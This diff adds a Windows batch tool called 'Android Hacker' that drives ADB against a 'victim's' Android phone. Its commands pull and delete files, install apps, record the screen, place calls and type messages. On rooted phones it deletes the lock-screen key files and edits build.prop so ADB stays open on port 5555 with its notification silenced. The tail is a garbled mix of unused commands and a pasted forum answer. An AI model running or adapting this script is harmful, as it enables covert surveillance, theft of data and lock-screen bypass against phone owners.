@@ -1,0 +1,885 @@
+@echo off
+title Android Hacker
+rem CursorHide
+mode con:cols=110 lines=50
+::rem ChangeColor %o1% %o2%
+
+color 0B
+:ano
+echo.                                                                                                                                                 
+echo                                            ..:///+osssssssssso+//:..                                     
+echo                                    .:/shdNNNNMMMMMMMMMMMMMMMMMMMMMNNNNmhy+/-                               
+echo                                 -odNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmh+.                          
+echo                               :hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy                        
+echo                              :NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh                      
+echo                             :NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh                       
+echo                             dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM-                      
+echo                            -NMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNMMMMMMMMMy                      
+echo                            +MMMMMmho/:---:/oydNMMMMMMMMMMMMMMMMNmyo/--..-:+ymMMMMMN                    
+echo                            hMMMmo//so+/:.    `./hNMMMMMMMMMMMdo-`  `..-:/os+/+hMMMM.                  
+echo                           .NMMhsdNMMms+/-``--`   -yMMMMMMMMm/`  `-/--::/smMMMmhyNMMo                     
+echo                           .MMNmMMMMMMMMMNho.`-/.   dMMMMMMM:  .//-./hNMMMMMMMMMNmMMs                     
+echo                           :MMMMMMMMMMMMMMMMms-`://+NMMMMMMMy/+/..odMMMMMMMMMMMMMMMMs                     
+echo                           +MMMMMMMMMMMMMMMMMMNh- :dMMMMMMMMNy`.smMMMMMMMMMMMMMMMMMMh                     
+echo                           sMMMMMMNmhysoosyhmNMMm- `hMMMMMMMy.sNMMNmyso//+sshmMMMMMMM                     
+echo                           hMMMMNy:`        `-odNm` .NMMMMMMmmMMds:`         `/dMMMMM                     
+echo                           hMMdo:               :m.  hMMMMMMMMM/               `++hmN                     
+echo                           oMMh ``..---::::://+sdd.  +MMMMMMMMMNo//+ooooo+/+oooyhhsoy                     
+echo                           hMMyhdNNMMMMMMMMMMMMMMm`  oMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM                     
+echo                           +MMMMMMMMMMMMMMMMMMMMMd   dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM                     
+echo                           `dMMMMMMMMMMMMMMMMMMMM+   dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN                     
+echo                             /MMMMMMMMMMMMMMMMMMM-   yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM+                     
+echo                            : yMMMMMMMMMMMMMMMMMy    oMMMMMMMMMMMMMMMMMMMMMMMMMMMMm+                      
+echo                            sy`.smMMMMMMMNNNMms/     dMMMMMMMmohNMMMMMMMMMMMMMMMd/:                       
+echo                            .mo  ...-::://+sm.  -:   mMMMMMMMMms/NMMh++osssoo+/. /y                       
+echo                             -N: +: `hNNMMMMN. :No  -MMMMMMMMMMModMMMNmmhy/  -/ .m-                       
+echo                              +N/`y- `oNMMMMMmodM+  +MMMMMMMMMMMNMMMMMMMNo  /m:`dy                        
+echo                               oNo.o:  .+hNMMMMMMN/ oMMMMMMhdMMMMMMMMMNy-  /N+`ym`                        
+echo                                sMh.//`   .-+yhdho` `:/ss/- `omMMMNdy+.   od:`hN-                         
+echo                                 oMd:.++-`     ``     -o-     `....`   `/yo`.dN:                          
+echo                                  oNN/ .ohs/-`       +mMNs.         .:ohy/ -mm:                           
+echo                                   +NNs` .smNmdys+++:++yss+.--///+sdmMMds.+Nd.                            
+echo                                    \mMy`  .ohmMMMMMNNNmmmmmNNMMMMMMMMMy.sNy`                             
+echo                                     \dMh`  odyyyhddmmmmmmmNNMMMMMMMMMs-dNo                               
+echo                                      \hMh` yMMMNmdh/....`./hMMMMMMMNo+Nm/                                
+echo                                       \sNh`yMMMMMMMN.    -mMMMMMMMNohNd-                                 
+echo                                         +Ns-MMMMMMMm.    /MMMMMMMMdmMy`                                  
+echo                                          -yhMMMMMMN-     `dMMMMMMMMN+`                                   
+echo                                            /mMMMMMd       +MMMMMMMm-                                     
+echo                                             -dMMMMN`      yMMMMMMy`                                      
+echo                                              .yNMMM+     .NMMMMd/                                        
+echo                                                /hNMm`    yMMNd/`                                         
+echo                                                  -+o.    os+-                               
+echo.
+echo.                                 
+pause >nul
+cls
+color 8b
+echo.
+echo "         ________  ________   ________  ________  ________  ___  ________                                ";
+echo "        |\   __  \|\   ___  \|\   ___ \|\   __  \|\   __  \|\  \|\   ___ \                               ";
+echo "        \ \  \|\  \ \  \\ \  \ \  \_|\ \ \  \|\  \ \  \|\  \ \  \ \  \_|\ \                              ";
+echo "         \ \   __  \ \  \\ \  \ \  \ \\ \ \   _  _\ \  \\\  \ \  \ \  \ \\ \                             ";
+echo "          \ \  \ \  \ \  \\ \  \ \  \_\\ \ \  \\  \\ \  \\\  \ \  \ \  \_\\ \                            ";
+echo "           \ \__\ \__\ \__\\ \__\ \_______\ \__\\ _\\ \_______\ \__\ \_______\                           ";
+echo "            \|__|\|__|\|__| \|__|\|_______|\|__|\|__|\|_______|\|__|\|_______|                           ";
+echo "                                                                                                         ";
+echo "         ___  ___  ________  ________  ___  __    _______   ________                                     ";
+echo "        |\  \|\  \|\   __  \|\   ____\|\  \|\  \ |\   ___\ |\   __  \                                    ";
+echo "        \ \  \\\  \ \  \|\  \ \  \___|\ \  \/  /|\ \  \__|_\ \  \|\  \                                   ";
+echo "         \ \   __  \ \   __  \ \  \    \ \   ___  \ \  \___\\ \   _  _\                                  ";
+echo "          \ \  \ \  \ \  \ \  \ \  \____\ \  \\ \  \ \  \__|_\ \  \\  \                                  ";
+echo "           \ \__\ \__\ \__\ \__\ \_______\ \__\\ \__\ \______\\ \__\\ _\                                 ";
+echo "            \|__|\|__|\|__|\|__|\|_______|\|__| \|__|\|______| \|__|\|__|                                ";          
+echo "                                                                                                         ";
+echo "         ________  _______   ___      ___ _______   ___       ________  ________  _______   ________     ";
+echo "        |\   ___ \|\   ___\ |\  \    /  /|\   ___\ |\  \     |\   __  \|\   __  \|\   ___\ |\   __  \    ";
+echo "        \ \  \_|\ \ \  \__|_\ \  \  /  / | \  \__|_\ \  \    \ \  \|\  \ \  \|\  \ \  \__|_\ \  \|\  \   ";
+echo "         \ \  \ \\ \ \  \___\\ \  \/  / / \ \  \___\\ \  \    \ \  \\\  \ \   ____\ \  \___\\ \   _  _\  ";
+echo "          \ \  \_\\ \ \  \__|_\ \    / /   \ \  \__|_\ \  \____\ \  \\\  \ \  \___|\ \  \__|_\ \  \\  \  ";
+echo "           \ \_______\ \______\\ \__/ /     \ \______\\ \_______\ \_______\ \__\    \ \______\\ \__\\ _\ ";
+echo "            \|_______|\|______| \|__|/       \|______| \|_______|\|_______|\|__|     \|______| \|__|\|__|";
+echo "                                                                                                         ";
+echo "         ________  ________  ________  ________  ___  ___  ________  ________   _________                ";
+echo "        |\   __  \|\   __  \|\   __  \|\   ____\|\  \|\  \|\   __  \|\   ___  \|\___   ___\              ";
+echo "        \ \  \|\  \ \  \|\  \ \  \|\  \ \  \___|  \  \\\  \ \  \|\  \ \  \\ \  \|___ \  \_|              ";
+echo "         \ \   ____\ \   _  _\ \   __  \ \_____  \ \   __  \ \   __  \ \  \\ \  \   \ \  \               ";
+echo "          \ \  \___|\ \  \\  \\ \  \ \  \|____|\  \ \  \ \  \ \  \ \  \ \  \\ \  \   \ \  \              ";
+echo "           \ \__\    \ \__\\ _\\ \__\ \__ ______\  \ \__\ \__\ \__\ \__\ \__\\ \__\   \ \__\             ";
+echo "            \|__|     \|__|\|__|\|__|\|__|\|_______|\|__|\|__|\|__|\|__|\|__| \|__|    \|__|             ";
+echo.
+pause >nul
+:: Android Hacker ;Author Prashant Mishra ;GitHub User :Prashant Mishra
+:: This Software Usess "ADB Commands" To Perform It's Task On Android Devices So Special Thanks To Google For Android Device, ADB, Developer Mode
+:: Before using this batch script you need Android SDK Or ADB Fastboot Tool For Your Convenience i have added ADB And Fastboot with package 
+color 8b
+::---------------------------------------------------------------------------------------------------------------Disclaimer
+cls
+echo.
+echo.
+echo.                                 ________________________
+echo.                                            :Disclaimer:
+echo.                                           __________________________
+echo.
+echo.         [*] This Batch Code Is Issued Only For knowledge Purpose Any Actions Or Activities
+echo.             Related To This Batch Code Is Solely Your Responsibility, The Misuse Of This
+echo.             Code Can Result In Criminal Charges Brought Against The Persons In Question. 
+echo.             The Author Will Not Be Held Responsible In The Event Any Criminal Charges Be
+echo.             Brought Against Any Individuals Misusing This Code To Break The Law.
+echo.             If You Fully Understand And Except This Disclaimer Then Only Hit Enter Or CLOSE NOW!
+echo.
+echo.   
+echo.
+echo              **** Don Not make Changes To Package Folder Otherwise Software Won't Work ****
+echo.
+echo.
+echo.
+echo.
+echo                  ___________To Except The Disclaimer And Continue Hit Any Key___________  
+pause >nul
+echo.
+echo.
+::------------------------------------------------------------------------------------------------------Disclaimer/Main Menu
+:menu1
+cd %MYFILES%
+mode con:cols=108 lines=50
+cls
+echo.
+echo.
+echo                    ----------------------------
+echo                                    Main Menu          
+echo                               ----------------------------
+echo.
+echo            [1] Scan Connected Victims
+echo.
+echo            [2] Wired Connection (Android Over USB).
+echo.
+echo            [3] Wireless Connection (Android Over Lan).
+echo.
+echo            [4] Turn WiFi On.
+echo.
+echo            [5] Turn Wireless Port On
+echo.
+echo            [6] Goto Menu 2 (If Connection Setup Already Done)    
+echo.
+echo            [7] Exit
+echo.
+rem CursorShow
+set input=""
+set /p input=  [-] Select an option number From Above:
+
+if %input%==1 goto adbdevices
+if %input%==2 goto wired
+if %input%==3 goto getip
+if %input%==4 goto wifi
+if %input%==5 goto adbport
+if %input%==6 goto menu2
+if %input%==7 goto Exit
+echo.
+@echo Not a valid choice Try Again
+pause >nul
+goto menu1
+::-------------------------------------------------------------------------------------------------------Main Menu/adbdevices
+:adbdevices
+cls
+adb devices -l | find "device product:" >nul
+ if errorlevel 1 (
+      echo [ No Devices Connected ]
+) else (
+    echo [ Victim's Device Connected ]
+    )
+echo.
+adb shell input keyevent 3 >nul 
+pause
+goto menu1
+::---------------------------------------------------------------------------------------------------------------adbdevices/wired
+:wired
+cls
+adb kill-server
+adb usb >nul
+timeout 5 >nul
+adb devices -l | find "device product:" >nul
+ if errorlevel 1 (
+ 	echo.
+    echo      [ No Devices Connected ]
+    echo      [-] Press Any Key To Back To Previous Menu ]
+    echo.
+    pause >nul
+    goto menu1 
+) else (
+    echo      [ Victim's Device Connected ]
+    )
+pause
+goto menu2
+::------------------------------------------------------------------------------------------------------wired/wifi
+:wifi 
+echo   Turning On Wifi If Already Not Enabled.. "If There Is No Error Or Message" Enjoy Your Wifi Is ON
+adb shell svc wifi enable
+echo.
+pause
+goto menu1
+::------------------------------------------------------------------------------------------------------wifi/getip
+:getip
+cls
+adb shell svc wifi enable
+echo.
+echo                                        __________________
+echo                                        ______ NOTE ______
+echo.
+echo     [  Please Fallow These Steps Before Connecting To Any Android Device(Victim) Wirelessly.  ]
+echo.
+echo   [1] Please Make Sure That The Android Devices(Victim) You Want To Connect And Machine(Attacker)
+echo        On Which The Software Is Running Are On The Same Wireless Network. 
+echo.
+echo   [2] The Device You Want To Connect Should Have Wireless Port "5555" Enabled If Not Then Connect
+echo        Victim's Device And Attacker Machine With A USB Cable And Go Back To Previous Menu
+echo        And Select "Option:- 4.Start Wireless Adbport"
+echo.
+echo   [3] Enter Local Ip Address Of the vitim's Device You Want To Connect if you don't know Victim's IP    
+echo        Connect Through USB To Get IP Address or Download "NMAP" For Your Windows Machine And "Fing" For
+echo        Your Android Devices To Find IP Address Of all the devices in your Network
+echo.
+adb shell ip -f inet addr show wlan0
+timeout 2 >nul
+echo.
+echo     If You Have Performed Every Step Correctly Your Victim's Device Local IP Will Be Displayed Above.
+echo     Please Enter "Victim's IP Mentioned Above" After "inet" and Before "/" For Example If The IP Diplayed
+echo     In This Format .."inet 192.168.10.103/24".. You Only Need To Copy 192.168.10.103
+echo.
+:inip
+echo                           __________ Press "e" To Go Back __________
+echo.
+set ip=""
+set /p ip=[-]  Please Enter IP Address :
+echo.
+if %ip%==e goto menu1
+if %ip%=="" echo      Please Enter Correct Ip & pause >nul & cls & goto inip
+goto wireless
+::--------------------------------------------------------------------------------------------------------------getip/wireless
+:wireless
+setlocal
+adb kill-server
+::connected
+>output.tmp adb connect %ip%:5555
+<output.tmp (
+  set /p line1=
+)
+echo %line1% | find/i "connected to" >nul
+::echo %line1% | find/i /i "connected to" >nul
+if errorlevel 0 (
+goto m2
+) else (
+cls 
+echo. & echo        Android Hacker Is connected With The Victim's Device Wirelessly.
+echo        Now You Can Remove The USB & echo.
+echo        Press Any Key To Continue To Menu 2
+pause >nul )
+goto menu2
+:m2
+::laptop wifi off
+echo %line1% | find/i "unreachable network" >nul
+if errorlevel 1 (
+goto m3 )
+else(
+echo. & echo laptop/Desktop Wifi IS Off Or Not connected To Local Wifi/LAN
+echo. & echo connect laptop/Desktop To The LAN. & echo. & pause >nul
+echo Press Any Key To Go Back
+goto getip
+)
+:m3
+:: Wrong Ip format
+echo %line1% | find/i "no such host" >nul            
+if errorlevel 1 (
+goto m4 )
+else(
+echo. & echo  Wrong Format IP Address...
+echo. & echo  Please Enter IP In Given Format Example "192.168.10.10"
+echo. & echo  Press Any Key To Continue....& pause >nul
+goto getip 
+)
+:m4
+::5555 port off
+echo %line1% | find/i "refused it" >nul
+if errorlevel 1 (
+goto m5 )
+else(
+    echo. & echo Android Wifi is off or
+echo. & echo Android Wireless Port Is Off
+echo. & echo Press Any Key To Turn On & pause >nul
+goto adbport
+)
+:m5
+:: Android Wifi Off
+echo %line1% | find/i "faild to respond" >nul
+if errorlevel 1 (
+goto m6 )
+else (
+echo. & echo  Could Not connect To Given IP
+echo. & echo  Reason Can Be...
+echo. & echo  Android Is Not connected To Local Wifi
+echo. & echo  Or No Device With This Ip In LAN & pause >nul
+goto getip
+)
+:m6
+echo.
+echo   Unknown Error & pause >nul 
+goto getip
+pause >nul
+        
+::------------------------------------------------------------------------------------------------------wired/adbport
+:adbport
+adb kill-server
+adb tcpip 5555
+adb devices
+echo.
+pause
+goto menu1
+::-------------------------------------------------------------------------------------------------------------menu 1 adbport/menu2
+:menu2
+cls
+echo                    ----------------------------
+echo                                      Menu 2
+echo                                ----------------------------
+echo.
+adb devices -l | find "device product:" >nul
+ if errorlevel 1 (
+    echo  No Devices Connected "Press 4" To Back To Previous Menu 
+) else (
+    echo  Victim's Device Connected
+    )
+adb shell input keyevent 3 >nul
+echo.
+echo           [1] Actions For " Non Root " Android Victims.
+echo.
+echo           [2] Special Action For " Root/Superuser " Android Victims.
+echo.
+echo           [3] Enter Your Own Commands.
+echo.
+echo           [4] Go Back To Main Menu
+::------------------------------------------------
+echo.
+set input=""
+set /p input=  [-] Select an option number above:
+if %input%==1 goto menu3
+if %input%==2 goto menu4
+if %input%==3 goto enterc
+if %input%==4 goto menu1
+rem CursorHide
+echo.
+@REM Invalid Choice Message
+@echo Not a valid choice Try Again
+pause >nul
+goto menu 2
+::------------------------------------------------------------------------------------------------------menu2/menu3
+:menu3
+cls
+echo.
+echo                    ----------------------------
+echo                                      Menu 3
+echo                                ----------------------------
+echo.
+adb devices -l | find "device product:" >nul
+ if errorlevel 1 (
+    echo      [ No Devices Connected "Press 14" To Back To Previous Menu ]
+) else (
+    echo      [ Victim's Device Connected ]
+    )
+echo.
+echo            [1]  List Base Files And Directories 
+echo.
+echo            [2]  Extract Data From Victim's Device
+echo            [3]  Upload Data To Victim's Devices
+echo            [4]  Delete Data From Victim's Devices
+echo.
+echo            [5]  Application Manager
+echo.
+echo            [6]  Spy On Victim's Device Screen (ScreenShot) 
+echo            [7]  Spy On Victim's Device Screen (Screen Recording)
+echo.
+echo            [8]  **** Make Call From Victim's Device ****
+echo.
+echo            [9]  Turn On WiFi
+echo            [10] Turn Off WiFi
+echo.
+echo            [11] Turn On Internet
+echo            [12] Turn Off Internet
+echo.
+echo            [13] Turn On Flight Mode
+echo            [14] Turn Of Flight Mobe
+echo.
+echo            [15] Enter ADB Shell Command
+echo.
+echo            [16] Unlock Device
+echo.
+echo            [17] Go Back To Previous Menu(Menu1)
+
+::-----------------------------------------------------
+echo.
+set input=""
+set /p input=  [-] Select an option number above:
+if %input%==1 goto basels
+if %input%==2 goto adbpull
+if %input%==3 goto getpath2
+if %input%==4 goto adbdel
+if %input%==5 goto appman
+if %input%==6 goto screencap
+if %input%==7 goto screenreco
+if %input%==8 goto call
+if %input%==9 adb shell svc wifi enable & pause & goto menu3
+if %input%==10 adb shell svc wifi disable & pause & goto menu3
+if %input%==11 adb shell svc data enable & pause & goto menu3
+if %input%==12 adb shell svc data disable & pause & goto menu3
+if %input%==13 adb shell settings put global airplane_mode_on 1 & pause & goto menu3
+if %input%==14 adb shell settings put global airplane_mode_on 0 & pause & goto menu3
+if %input%==15 goto enterc
+if %input%==16 goto munlock
+if %input%==17 goto menu1
+
+rem CursorHide
+echo.
+@REM Invalid Choice Message
+@echo Not a valid choice Try Again
+pause >nul
+goto menu3
+::---------------------------------------------------------------------------------------------------
+:basels
+cls
+echo.
+echo  List Of Files And Directories Of Base Folder " / ".
+echo.
+adb shell ls
+echo.
+echo  Walk The Tree And Navigate Through Directories, Type "cd Directory Name" To Enter Any Directory
+echo  And "cd -" To Go Back To Previous Directory,
+echo  Type "Exit" Or Press "ctrl+D" Any Time To EXit Directory View.
+echo.
+rem CursorShow
+adb shell
+goto menu3
+::-----------------------------------------------------------------------------------------------------------
+:adbpull
+rem CursorShow
+echo.
+echo Enter Complete Path With Name And Extention Of Data
+echo Which Has To Be Downloaded From Victim's Device:
+set vsource1=""
+set /p vsource1=[
+md Androiddata
+adb pull /%vsource1% %cd%\Androiddata
+pause
+goto menu3
+::-----------------------------------------------------------------------------------------------------------
+:getpath2
+echo.
+echo Choose File To Uploaded To Victim's Device:
+set hsource1=""
+set result=""
+rem BrowseFiles
+set /p hsource1=%result%
+if exist "%hsource1%" goto destination
+::================================================
+::getpath2
+::rem BrowseFiles
+::echo Enter Complete Path With Name And Extention Of Data 
+::echo To Uploaded To Victim's Device:
+::set hsource1=""
+::set /p hsource1=[
+::goto destination
+::-----------------------------------------------------
+:destination
+echo.
+rem CursorShow
+echo Enter Complete Path Of Victim's Device Where Data Has To Be Uploaded:
+set /p vdestinpath1=[
+goto push
+::---------------------------------------------------
+:push
+adb push %hsource1% /%vdestinpath1%/
+pause
+goto menu3
+::------------------------------------------------------------------------------------------------------------------
+:adbdel
+rem CursorShow
+echo.
+echo Enter Complete Path With Name And Extention Of Data
+echo To Be Deleted From Victim's Device:  
+set vsource2=""
+set /p vsource2=[
+adb shell rm -r %vsource2%
+pause
+goto menu3
+::---------------------------------------------------------------------------------------------------------------
+:appman
+cls
+echo.
+echo                    ----------------------------
+echo                                  Applicatin/Package Manager
+echo                              ----------------------------
+echo.
+adb devices -l | find "device product:" >nul
+ if errorlevel 1 (
+    echo      [ No Devices Connected "Press 14" To Back To Previous Menu ]
+) else (
+    echo      [ Victim's Device Connected ]
+    )
+echo.
+echo            [1] List Of All Application
+echo            [2] List Of System Application
+echo            [3] List Of Third-Party Application
+echo            [4] Install Application On Victims Device
+echo            [5] Uninstall Application From Victims Device
+echo            [6] Previouse Menu
+echo.
+set input=""
+set /p input=  [-] Select an option number above:
+if %input%==1 cls & adb shell pm list packages & pause & goto appman
+if %input%==2 cls & adb shell pm list packages -s & pause & goto appman
+if %input%==3 cls & adb shell pm list packages -3 & pause & goto appman
+if %input%==4 goto insapp
+if %input%==5 goto unsapp
+if %input%==6 goto menu3
+echo.
+@echo Not a valid choice Try Again
+pause >nul
+goto appman
+::-------------------------------------------------------
+:insapp
+cls
+echo.
+echo            Please Enter Full Path Of The .apk With Name And Extention File Which Is To Be Installed
+echo.
+set apkins=""
+set /p apkins=[
+echo.
+adb install -r %apkins%
+pause
+goto appman
+::------------------------------------------
+:unsapp
+cls
+echo.
+adb shell pm list packages -3
+echo.
+echo            Please Enter Correct Name Of Application From Above List To Uninstall
+echo            For Example "com.application"
+echo.
+set apkuns=""
+set /p apkuns=[
+echo.
+adb uninstall %apkuns%
+pause
+goto appman
+::------------------------------------------------------------------------------------------------------------menu3 appmanager/ScreenShot
+:screencap
+cls
+echo.
+adb devices -l | find "device product:" >nul
+ if errorlevel 1 (
+    echo      [ No Devices Connected Press Any Key To Back To Previous Menu ]
+    echo.
+    pause >nul
+    goto menu3 
+) else (
+    echo      [ Victim's Device Connected ]
+    )
+echo.
+echo    Android Hacker Performing ScreeenShot......
+echo    ScreeenShot Will Be Saved In Victim's Device /sdcard/reco And Will Be Extracted.  
+adb -d shell mkdir /sdcard/reco
+adb shell screencap /sdcard/reco/screen.png
+echo.
+md Androiddata
+adb -d pull /sdcard/reco %cd%\Androiddata
+pause
+goto menu3
+::---------------------------------------------------------------------------------------------------------ScreenShot/screenrecord
+:screenreco
+cls
+echo.
+adb devices -l | find "device product:" >nul
+ if errorlevel 1 (
+    echo      [ No Devices Connected Press Any Key To Back To Previous Menu ]
+    echo.
+    pause >nul
+    goto menu3 
+) else (
+    echo      [ Victim's Device Connected ]
+    )
+echo.
+echo    Android Hacker Is Performing Screen Recording.......
+echo    Recorded MP4 Will Be Saved In Victim's Device /sdcard/reco And Will Be Extracted As Recording Stops.
+echo    To Stop Recording Any Time Press Ctrl+C Otherwise Maximum Recording Time Is Set To 30 Minutes.
+echo    Every 3 Minutes Screen Recording Will Be Stoped By The Device And Again Started By Android Hacker. 
+echo.
+adb -d shell mkdir /sdcard/reco
+adb -d shell screenrecord --verbose /sdcard/reco/reco1.mp4
+adb -d shell screenrecord --verbose /sdcard/reco/reco2.mp4
+adb -d shell screenrecord --verbose /sdcard/reco/reco3.mp4
+adb -d shell screenrecord --verbose /sdcard/reco/reco4.mp4
+adb -d shell screenrecord --verbose /sdcard/reco/reco5.mp4
+adb -d shell screenrecord --verbose /sdcard/reco/reco6.mp4
+adb -d shell screenrecord --verbose /sdcard/reco/reco7.mp4
+adb -d shell screenrecord --verbose /sdcard/reco/reco8.mp4
+adb -d shell screenrecord --verbose /sdcard/reco/reco9.mp4
+adb -d shell screenrecord --verbose /sdcard/reco/reco10.mp4
+goto pullreco
+::-------------------------------------------------------------------------------------
+:pullreco
+echo.
+echo Extracting Screen Recording .mp4 From vitim's Device.
+echo.
+md Androiddata
+adb -d pull /sdcard/reco %cd%\Androiddata
+pause
+goto menu3
+::------------------------------------------------------------------------------------------------------------screenrecord/calling
+:call
+cls
+echo.
+echo    Please Enter The Phone Number On Which You Want To Call From Victim's
+echo.
+set callno=""
+set /p callno=[ 
+echo.
+adb shell am start -a android.intent.action.CALL tel:%callno%
+echo.
+pause
+goto menu3 
+
+::--------------------------------------------------------------------------------------------------------------calling/enterown command
+rem CursorShow
+:enterc
+adb shell
+pause
+goto menu3
+::---------------------------------------------------------------------------------------------------enterown command/munlock
+:munlock
+cls
+echo.
+echo                    ----------------------------
+echo                                    Unlock/Type Message
+echo                               ----------------------------
+echo.
+adb devices -l | find "device product:" >nul
+ if errorlevel 1 (
+    echo      [ No Devices Connected "Press 4" To Back To Previous Menu ]
+) else (
+    echo      [ Victim's Device Connected ]
+    )
+echo.
+echo            [1]  Send Default Message On Victim's Device If Device Is Unlocked.
+echo.
+echo            [2]  Type Your Own Message If Device IS Unlocked.
+echo.           
+echo            [3]  Unlock Victim's Device If You Know Password.
+echo.
+echo            [4]  Got To Previous Menu/menu3             
+echo.
+set inpur=""
+set /p input=  [-] Select an option number above:
+if %input%==1 goto dmsg
+if %input%==2 goto ymsg
+if %input%==3 goto entpass
+if %input%==4 goto menu3
+echo.
+@echo Not a valid choice Try Again
+pause >nul
+goto munlock
+::---------------------------------------------
+:dmsg
+echo.
+echo Hit Any To Start Typing Message
+pause > nul
+adb shell input swipe 407 1211  378 85
+adb shell input text "Heloooo"
+adb shell input keyevent 62
+adb shell input text "Your"
+adb shell input keyevent 62
+adb shell input text "Device"
+adb shell input keyevent 62
+adb shell input text "Is"
+adb shell input keyevent 62
+adb shell input text "Hacked"
+adb shell input keyevent 62
+adb shell input text "By"
+adb shell input keyevent 62
+adb shell input text "Android"
+adb shell input keyevent 62
+adb shell input text "Hacker"
+adb shell input keyevent 62
+adb shell input text "Author"
+adb shell input keyevent 62
+adb shell input text "Prashant"
+adb shell input keyevent 62
+adb shell input text "Thankyou"
+adb shell input keyevent 62
+adb shell input keyevent 66
+pause
+goto fun
+::------------------------------------------------
+:ymsg
+echo.
+echo            [-]  Enter Your Message To Send On Victim's Device.
+echo            ***Note:- Type Only Alphabets And Digits Without Space Or Any Special Characters.
+set msg=""
+set /p msg=[
+echo.
+adb shell input swipe 407 1211  378 85
+adb shell input text "%msg%"
+pause
+goto fun
+::-------------------------------------------------
+:entpass
+echo.
+echo           [-] Enter Password To Unlock Victim's Device
+echo.
+set pass=""
+set /p pass=[
+adb shell input keyevent 3
+adb shell input swipe 407 1211  378 85
+adb shell input text "%pass%"
+adb shell input keyevent 66
+adb shell input keyevent 3
+echo.
+pause
+goto fun
+
+::------------------------------------------------------------------------------------------------------------------munlock/Menu 4
+:Menu4
+cls
+echo.
+echo                    ----------------------------
+echo                                      Menu 4
+echo                                ----------------------------
+echo.
+adb devices -l | find "device product:" >nul
+ if errorlevel 1 (
+    echo       [ No Devices Connected "Press 6" To Back To Previous Menu ]
+) else (
+    echo       [ Victim's Device Connected ]
+    )
+echo.
+echo            This Menu Is Only For Rooted Android Device
+echo            Features Won't Work If Victim's Phone Is Not Rooted
+echo.
+echo            [1] Open Lock Screen
+echo.
+echo            [2] Developer Defined build.prop Changes
+echo            [3] Download, Tweak And Upload Build.prop
+echo.
+echo            [4] Turn On Bluetooth
+echo            [5] Turn Of Bluetooth
+echo.
+echo            [6] Go To Menu 3 For Non Rooted Devices
+echo            [7] Go Back To Previous Menu/Menu 2
+
+echo.
+set input=""
+set /p input=  [-] Select an option number above:
+if %input%==1 goto lckscreen
+if %input%==2 goto devbuild
+if %input%==3 goto dtubuild
+if %input%==4 adb shell "su -c 'service call bluetooth 3'" & pause & goto menu4
+if %input%==5 adb shell "su -c 'service call bluetooth 5'" & pause & goto menu4
+if %input%==6 goto menu3
+if %input%==7 goto menu2
+echo.
+@echo Not a valid choice Try Again
+pause >nul
+goto menu4
+::------------------------------------------------------------------
+:lckscreen
+adb shell "su -c 'rm /data/system/*.key'"
+adb shell input keyevent 3
+adb shell input swipe 407 1211  378 85
+pause
+goto menu4
+::-------------------------------------------------------------------------------build.prop
+::best way to tweak build.prop
+:devbuild
+adb shell "su -c 'setprop persist.adb.notify 0'"
+adb shell "su -c 'echo "persist.adb.notify=0" >> /system/build.prop'"
+adb shell "su -c 'echo "service.adb.tcp.port=5555" >> /system/build.prop'"
+adb shell "su -c 'echo "persist.service.adb.root=1" >> /system/build.prop'"
+adb shell chmod 644 /system/build.prop
+echo.
+pause
+goto menu4
+::-----------------------------------------------------------Download, Tweak And Upload Build.prop
+:dtubuild
+echo.
+md Androiddata
+adb pull /system/build.prop %cd%\Androiddata
+echo.
+echo    [*]  Build File Is Downloaded In Androiddata Folder.
+echo         Now Open And Edit Build.prop Then Come Back And Any Press Any Key To Upload It To Android Device
+echo         ***Note Carefully Edit Build.prop Because Little Mistake Can Brick Your Android Device.
+echo         ***Do Not Rename Or Change Location Of Build.prop File
+echo         ***Uploading Build.prop To System Folder Needs Rooted Android Device
+echo.
+echo         If You Are Done Tweaking Build File Press Any Key To Upload It.
+pause >nul
+echo.
+adb shell "su -c 'adb push %cd%\Androiddata\build.prop /system/build.prop'"
+adb shell chmod 644 /system/build.prop
+echo.
+pause
+goto menu4
+::---------------------------------------------------------------------------------------------------------build.prop
+:: below code is not included in the program 
+
+adb sideload <update.zip>
+
+:: for M+
+adb reboot sideload
+
+open bootloader
+install updates sideload
+full devices bsckup 
+restore
+Change MAC Address
+Change LAN IP Address
+change IMEI
+adb root
+
+adb shell
+su
+service call bluetooth 3
+
+adb shell am start -a android.intent.action.CALL tel:1112223333
+adb -s <serialno> shell am start -a android.intent.action.CALL -d tel:555-5555
+
+
+adb shell "su -c '[your command goes here]'"
+goto menu3
+service call bluetooth_manager 8
+adb shell "su -c 'service call bluetooth 5'"
+
+adb shell am start -n com.steinwurf.adbjoinwifi/com.steinwurf.adbjoinwifi.MainActivity -e ssid [SSID] -e password_type [PASSWORD_TYPE] -e password [WIFI PASSWORD
+adb shell am start -n com.steinwurf.adbjoinwifi/com.steinwurf.adbjoinwifi.MainActivity -e ssid [Brains] -e password_type [WPA/WPA2 PSK] -e password [9..9..6@x]
+
+
+down vote
+accepted
+This is possible to achieve using wpa_cli, command line interface of wpa_supplicant:
+
+# Enable WiFi
+adb root
+adb shell
+
+# Get to wpa_cli prompt
+wpa_cli -p /data/misc/wifi/sockets/ -i wlan0
+
+# Add new WiFi network
+add_network
+set_network 0 auth_alg OPEN
+set_network 0 key_mgmt WPA-PSK
+set_network 0 ssid "network_name"
+set_network 0 proto RSN
+set_network 0 mode 0
+set_network 0 psk "password"
+
+# Connect to it
+select_network 0
+enable_network 0
+reassociate
+
+# Check the status
+status
+
+:instag
+adb install %cd%/apk/AntiGuard.apk
+:startag
+adb shell am start -S io.kos.antiguard/.unlock
+:uninstag
+adb uninstall io.kos.antiguard`
+:inag
+adb install %cd%/apk/app-debug.apk
+:tiadb
+set /p ssid=[-]  Please Enter WiFi Name :
+set /p past=[-]  Please Enter Wifi Password Encription Type  :
+set /p wpass=[-]  Please Enter WiFi Password :
+:startadb
